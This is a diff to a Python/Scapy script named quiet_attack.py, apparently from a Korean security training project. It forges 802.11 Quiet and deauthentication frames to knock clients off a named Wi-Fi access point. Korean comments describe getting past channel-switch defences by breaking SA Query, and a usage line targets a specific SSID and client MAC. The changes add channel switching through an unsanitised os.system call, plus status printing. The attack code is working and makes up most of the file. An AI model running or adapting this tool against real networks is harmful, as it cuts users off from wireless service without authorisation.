@@ -10,16 +10,25 @@ mac_list = []
 quiet_packets = []
 deauth_packets = []
 conf.verb=0
+
+ALGO_OPEN_AUTH = 0  # OPN
+START_SEQNUM = 1  # sequence number
+SYSTEM_STR = "[\x1b[36m*\x1b[0m]"
+WARN_STR = "[\x1b[31m!\x1b[0m]"
+INFO_STR = "\x1b[33m-\x1b[0m"
+
 # Mentee와 같은 여러개의 채널에 존재하는 AP의 경우 일반적인 CSA로는 연결을 끊을 수 없었음
 # 그렇기 때문에 SA Query를 씹는 방식으로 AP가 STA에 연결을 끊도록 유도함
 # 현재 AX200에서는 성공함.
 #########################################################################################################
-#						usage
+#											usage
 # 공격을 시작하기 전에 STA이 어느채널에 존재하는 AP에 물려 있는지를 먼저 확인해야 한다.
 # python3 quiet_attack.py -i mon0 -v KITRI_Mentee -d broadcast -s 2c:6d:c1:32:90:ba --aggressive True
 #########################################################################################################
 
 def quiet_attack(parser):
+    # channel switch
+	channel_switch(parser)
 	while not len(quiet_packets):
 		print("[*]Sniffing wild packets")
 		sniff(iface=parser.interface, stop_filter = stop_filter_beacon, count = 200)
@@ -27,9 +36,9 @@ def quiet_attack(parser):
 	send_quiet(parser)
 
 
-###############################################################
-#					quiet
-###############################################################
+#########################################################################################################
+#											quiet
+#########################################################################################################
 
 def stop_filter_beacon(packet):
 	if packet.haslayer(Dot11Beacon):
@@ -37,7 +46,7 @@ def stop_filter_beacon(packet):
 		dot11 = packet.getlayer(Dot11)
 		beacon = packet.getlayer(Dot11Beacon)
 		if bytes(parser.ssid,'utf-8') == elt.info and dot11.addr3 not in mac_list:
-			print(f"[!]SSID: {elt.info}, MAC:{dot11.addr3}")
+			print("\t"+INFO_STR+" Access Point MAC Address (BSSID) : %s" % dot11.addr3)
 			mac_list.append(dot11.addr3)
 			make_quiet(parser, elt, dot11)
 
@@ -75,6 +84,7 @@ def send_quiet_t(parser, frame):
 		sendp(frame, iface=parser.interface, count = 6)
 
 def send_quiet(parser):
+	printProgressBar()
 	for i in range(0,len(quiet_packets)):
 		t = threading.Thread(target=send_quiet_t, args=(parser,quiet_packets[i]))
 		t.start()
@@ -88,9 +98,26 @@ def send_deauth(parser, frame):
 		sendp(frame, iface=parser.interface, count = 6)
 
 
-###############################################################
-#						Parser 설정
-###############################################################
+##################################################################################################
+#											기타 함수
+##################################################################################################
+
+def channel_switch(parser):
+    print(WARN_STR+" Channel Switching : Ch."+str(parser.channel))
+    os.system('iwconfig ' + parser.interface + ' channel ' + str(parser.channel))
+
+def show_info(parser):
+    print(SYSTEM_STR+" Information")
+    print("\t"+INFO_STR+" SSID Information : %s" % parser.ssid)
+    print("\t"+INFO_STR+" Channel : Ch.%s" % parser.channel)
+    print("\t"+INFO_STR+" Interface : %s" % parser.interface)
+
+def printProgressBar():
+    print("\x1b[36m->\x1b[0m",end="",flush=True)
+
+#########################################################################################################
+#											Parser 설정
+#########################################################################################################
 
 class PARSER:
 	def __init__(self, opts):
@@ -127,9 +154,10 @@ class PARSER:
 				return ch
 			else:
 				print("Invalid Channel Given.")
+				exit(-1)
 		else:
 			print("No Channel Given")
-			#exit(-1)
+			exit(-1)
 	
 	def interface(self, iface):
 		def getNICnames():
@@ -189,5 +217,5 @@ if __name__ == '__main__':
 
 	options = parser.parse_args()
 	parser = PARSER(options)
-	print(parser.sta)
+	show_info(parser)
 	quiet_attack(parser)
